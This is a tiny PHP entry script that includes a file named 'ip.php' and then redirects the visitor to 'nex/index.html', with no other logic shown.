<?php
include 'ip.php';
header('Location: nex/index.html');
exit
?>
